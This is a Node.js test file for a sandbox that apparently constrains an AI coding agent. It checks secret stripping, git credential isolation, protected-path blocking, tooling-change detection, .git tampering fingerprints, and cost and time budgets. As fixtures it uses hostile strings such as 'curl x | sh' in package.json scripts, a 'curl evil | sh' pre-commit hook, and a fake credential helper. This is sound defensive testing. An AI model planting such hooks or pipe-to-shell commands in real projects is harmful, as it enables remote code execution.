const test = require('node:test');
const assert = require('node:assert');
const { execFileSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const {
  buildAgentEnv,
  parseStatusZ,
  findProtectedChanges,
  changedPackageFields,
  isNamedInAffects,
  findUndeclaredToolingChanges,
  gitMetaFingerprint,
  createTaskBudget,
} = require('./boundary');
const { PROTECTED_PATHS } = require('./config');

test('buildAgentEnv drops tokens and unknown secrets, keeps what claude needs', () => {
  const env = buildAgentEnv({
    PATH: '/usr/bin',
    Path: 'C:\\Windows',
    HOME: '/home/u',
    USERPROFILE: 'C:\\Users\\u',
    ANTHROPIC_API_KEY: 'sk-ant',
    CLAUDE_CODE_OAUTH_TOKEN: 'oauth',
    GH_TOKEN: 'gh',
    GITHUB_TOKEN: 'ghs',
    AWS_SECRET_ACCESS_KEY: 'aws',
    DATABASE_URL: 'postgres://x',
    UNDEFINED_VALUE: undefined,
  });
  for (const name of ['GH_TOKEN', 'GITHUB_TOKEN', 'AWS_SECRET_ACCESS_KEY', 'DATABASE_URL', 'UNDEFINED_VALUE']) {
    assert.ok(!(name in env), name);
  }
  assert.strictEqual(env.PATH, '/usr/bin');
  assert.strictEqual(env.Path, 'C:\\Windows');
  assert.strictEqual(env.HOME, '/home/u');
  assert.strictEqual(env.USERPROFILE, 'C:\\Users\\u');
  assert.strictEqual(env.ANTHROPIC_API_KEY, 'sk-ant');
  assert.strictEqual(env.CLAUDE_CODE_OAUTH_TOKEN, 'oauth');
});

const ISOLATION_KEYS = ['GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0', 'GIT_CONFIG_VALUE_0', 'GIT_TERMINAL_PROMPT', 'GCM_INTERACTIVE', 'GH_CONFIG_DIR'];

test('buildAgentEnv matches allowed names case-insensitively only', () => {
  const env = buildAgentEnv({ systemroot: 'C:\\Windows', gh_token: 'x', github_token: 'y' }, '/tmp/empty');
  assert.deepStrictEqual(Object.keys(env).sort(), ['systemroot', ...ISOLATION_KEYS].sort());
});

test('buildAgentEnv isolates git and gh credentials and ignores source values for those keys', () => {
  const env = buildAgentEnv({ PATH: '/bin', GH_CONFIG_DIR: '/home/u/.config/gh', GIT_CONFIG_COUNT: '5' });
  assert.strictEqual(env.GIT_CONFIG_COUNT, '1');
  assert.strictEqual(env.GIT_CONFIG_KEY_0, 'credential.helper');
  assert.strictEqual(env.GIT_CONFIG_VALUE_0, '');
  assert.strictEqual(env.GIT_TERMINAL_PROMPT, '0');
  assert.notStrictEqual(env.GH_CONFIG_DIR, '/home/u/.config/gh');
  assert.deepStrictEqual(fs.readdirSync(env.GH_CONFIG_DIR), []);
});

test('a credential helper configured for the repository is not consulted under the agent env', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ralph-cred-'));
  try {
    execFileSync('git', ['init', '-q'], { cwd: dir });
    execFileSync('git', ['config', 'credential.helper', '!f() { echo username=u; echo password=leaked-secret; }; f'], { cwd: dir });
    const fill = (env) => {
      try {
        return execFileSync('git', ['credential', 'fill'], {
          cwd: dir,
          env,
          input: 'protocol=https\nhost=example.invalid\n\n',
          encoding: 'utf8',
          stdio: ['pipe', 'pipe', 'ignore'],
        });
      } catch (error) {
        return String(error.stdout || '');
      }
    };
    const baseEnv = { PATH: process.env.PATH, HOME: dir, GIT_TERMINAL_PROMPT: '0' };
    assert.match(fill(baseEnv), /leaked-secret/, 'helper works without isolation');
    assert.doesNotMatch(fill(buildAgentEnv(baseEnv)), /leaked-secret/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('parseStatusZ reads plain entries, renames and names with spaces', () => {
  const out = [' M apps/api/src/a.ts', '?? docs/new file.md', 'R  scripts/a.ts', 'apps/api/src/a.ts', ''].join('\0');
  assert.deepStrictEqual(parseStatusZ(out), [
    { status: ' M', path: 'apps/api/src/a.ts', origPath: null },
    { status: '??', path: 'docs/new file.md', origPath: null },
    { status: 'R ', path: 'scripts/a.ts', origPath: 'apps/api/src/a.ts' },
  ]);
  assert.deepStrictEqual(parseStatusZ(''), []);
});

const statusOf = (...paths) => parseStatusZ(paths.map((p) => `?? ${p}`).join('\0'));

test('protected paths are blocked, including a different letter case and a rename target', () => {
  assert.deepStrictEqual(findProtectedChanges(statusOf('scripts/x.js'), PROTECTED_PATHS), ['scripts/x.js']);
  assert.deepStrictEqual(findProtectedChanges(statusOf('.GitHub/workflows/a.yml'), PROTECTED_PATHS), ['.GitHub/workflows/a.yml']);
  const rename = parseStatusZ('R  scripts/a.ts\0apps/api/src/a.ts\0');
  assert.deepStrictEqual(findProtectedChanges(rename, PROTECTED_PATHS), ['scripts/a.ts']);
  const renameOut = parseStatusZ('R  apps/api/src/b.ts\0.husky/pre-commit\0');
  assert.deepStrictEqual(findProtectedChanges(renameOut, PROTECTED_PATHS), ['.husky/pre-commit']);
  for (const p of ['.claude/settings.json', 'apps/api/prisma/prompts/p.txt', 'apps/api/knowledge-sources/k.md', '.git/hooks/pre-commit']) {
    assert.deepStrictEqual(findProtectedChanges(statusOf(p), PROTECTED_PATHS), [p], p);
  }
});

test('ordinary paths and look-alike names are not blocked', () => {
  const entries = statusOf('apps/api/src/a.ts', 'docs/scripts-notes.md', 'apps/web/scripts/x.js', 'myscripts/x.js', 'apps/api/prisma/schema.prisma');
  assert.deepStrictEqual(findProtectedChanges(entries, PROTECTED_PATHS), []);
});

test('changedPackageFields reports only fields that change execution', () => {
  const before = JSON.stringify({ description: 'a', scripts: { test: 'jest' }, dependencies: { a: '1' } });
  assert.deepStrictEqual(changedPackageFields(before, JSON.stringify({ description: 'b', scripts: { test: 'jest' }, dependencies: { a: '1' } })), []);
  assert.deepStrictEqual(changedPackageFields(before, JSON.stringify({ description: 'a', scripts: { test: 'curl x | sh' }, dependencies: { a: '1' } })), ['scripts']);
  assert.deepStrictEqual(changedPackageFields(before, JSON.stringify({ description: 'a', scripts: { test: 'jest' }, dependencies: { a: '2' } })), ['dependencies']);
  assert.deepStrictEqual(changedPackageFields(null, JSON.stringify({ scripts: { x: 'y' } })), ['scripts']);
  assert.deepStrictEqual(changedPackageFields(before, '{ broken'), ['(unparseable package.json)']);
});

test('isNamedInAffects needs the path as its own token', () => {
  const affects = '- `apps/api/package.json` (new dep)\n- apps/api/src/x.ts\n';
  assert.ok(isNamedInAffects('apps/api/package.json', affects));
  assert.ok(isNamedInAffects('apps/api/src/x.ts', affects));
  assert.ok(!isNamedInAffects('package.json', affects));
  assert.ok(!isNamedInAffects('apps/web/package.json', affects));
  assert.ok(!isNamedInAffects('apps/api/package.json', ''));
});

const toolingCheck = (entries, affects, before, after) =>
  findUndeclaredToolingChanges(entries, affects, (p) => before[p] ?? null, (p) => after[p] ?? null);

test('a scripts change in package.json without Affects is a violation', () => {
  const entries = parseStatusZ(' M apps/api/package.json\0');
  const before = { 'apps/api/package.json': JSON.stringify({ scripts: { test: 'jest' } }) };
  const after = { 'apps/api/package.json': JSON.stringify({ scripts: { test: 'node evil.js' } }) };
  assert.deepStrictEqual(toolingCheck(entries, '- apps/api/src/a.ts', before, after), ['apps/api/package.json (scripts)']);
  assert.deepStrictEqual(toolingCheck(entries, '- `apps/api/package.json`', before, after), []);
});

test('a package.json change that does not touch guarded fields passes', () => {
  const entries = parseStatusZ(' M apps/api/package.json\0');
  const before = { 'apps/api/package.json': JSON.stringify({ description: 'a', scripts: { test: 'jest' } }) };
  const after = { 'apps/api/package.json': JSON.stringify({ description: 'b', scripts: { test: 'jest' } }) };
  assert.deepStrictEqual(toolingCheck(entries, '', before, after), []);
});

test('tool config files outside Affects are violations, ordinary sources are not', () => {
  const entries = statusOf('apps/api/tsconfig.json', 'apps/web/vitest.config.ts', 'apps/web/eslint.config.mjs', 'apps/api/jest.config.js', 'apps/api/.eslintrc.js', 'apps/api/src/a.ts');
  assert.deepStrictEqual(toolingCheck(entries, '', {}, {}), [
    'apps/api/tsconfig.json',
    'apps/web/vitest.config.ts',
    'apps/web/eslint.config.mjs',
    'apps/api/jest.config.js',
    'apps/api/.eslintrc.js',
  ]);
  assert.deepStrictEqual(toolingCheck(statusOf('apps/api/tsconfig.json'), '- apps/api/tsconfig.json', {}, {}), []);
});

const git = (dir, ...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' });

const withRepo = (fn) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ralph-boundary-'));
  try {
    git(dir, 'init', '-q');
    fs.writeFileSync(path.join(dir, 'a.txt'), 'a\n');
    git(dir, 'add', '-A');
    git(dir, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-qm', 'init');
    return fn(dir);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
};

test('gitMetaFingerprint is stable across the read-only git commands the controller and agent run', () => {
  withRepo((dir) => {
    const base = gitMetaFingerprint(dir);
    fs.writeFileSync(path.join(dir, 'a.txt'), 'changed\n');
    git(dir, 'status', '--porcelain', '-z', '-uall');
    git(dir, 'diff', 'HEAD');
    git(dir, 'show', 'HEAD:a.txt');
    git(dir, 'log', '--oneline');
    assert.strictEqual(gitMetaFingerprint(dir), base);
  });
});

test('gitMetaFingerprint catches any change inside .git that affects behaviour', () => {
  const mutations = {
    'hook added': (dir) => fs.writeFileSync(path.join(dir, '.git', 'hooks', 'pre-commit'), 'curl evil | sh\n'),
    'config changed': (dir) => git(dir, 'remote', 'add', 'evil', 'https://example.invalid/x.git'),
    'info/exclude hides files': (dir) => fs.appendFileSync(path.join(dir, '.git', 'info', 'exclude'), 'scripts/\n'),
    'info/attributes added': (dir) => fs.writeFileSync(path.join(dir, '.git', 'info', 'attributes'), '* filter=x\n'),
    'ref moved': (dir) => git(dir, 'branch', 'other'),
    'HEAD switched': (dir) => fs.writeFileSync(path.join(dir, '.git', 'HEAD'), 'ref: refs/heads/other\n'),
    'hook executable bit flipped': (dir) => {
      const hook = path.join(dir, '.git', 'hooks', 'pre-commit.sample');
      fs.chmodSync(hook, fs.statSync(hook).mode & 0o111 ? 0o644 : 0o755);
    },
  };
  for (const [name, mutate] of Object.entries(mutations)) {
    withRepo((dir) => {
      const base = gitMetaFingerprint(dir);
      mutate(dir);
      assert.notStrictEqual(gitMetaFingerprint(dir), base, name);
    });
  }
});

test('createTaskBudget stops on time and on cost', () => {
  let clock = 0;
  const budget = createTaskBudget({ maxWallClockMs: 1000, maxUsd: 5, now: () => clock });
  assert.strictEqual(budget.exhaustedReason(), null);
  budget.record(2);
  budget.record(undefined);
  assert.strictEqual(budget.remainingUsd(), 3);
  budget.record(3);
  assert.match(budget.exhaustedReason(), /cost budget/);

  const timed = createTaskBudget({ maxWallClockMs: 1000, maxUsd: null, now: () => clock });
  assert.strictEqual(timed.remainingUsd(), null);
  clock = 999;
  assert.strictEqual(timed.exhaustedReason(), null);
  clock = 1000;
  assert.match(timed.exhaustedReason(), /time budget/);
});
